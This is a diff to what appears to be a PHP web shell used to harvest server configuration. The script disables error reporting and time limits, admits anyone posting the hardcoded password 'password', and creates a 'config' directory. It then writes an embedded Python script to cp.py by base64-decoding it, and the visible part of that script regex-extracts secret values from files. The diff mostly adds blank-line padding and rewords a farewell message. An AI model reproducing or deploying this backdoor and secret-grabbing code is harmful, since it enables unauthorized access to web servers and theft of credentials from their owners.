@@ -1,4 +1,4 @@
-<?php 
+ <?php 
 @set_time_limit(0);
 @error_reporting(0);
 echo '<head>
@@ -94,6 +94,19 @@ if($_POST['pass']=='password'){
 error_reporting(0);
 mkdir('config',0755);
 $cp =
+
+
+
+
+
+
+
+
+
+
+
+
+
 #!/usr/bin/env python
 
 '''
@@ -242,7 +255,30 @@ try:
         if secr7 is not None: print (secr7.group(2))
       f.close()
 except (KeyboardInterrupt):
-  print '\nBerhasil Cok';
+  print '\nThanks for using it ._^';
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 $file = fopen("cp.py","w+");
 $write = fwrite ($file ,base64_decode($cp));
 fclose($file);
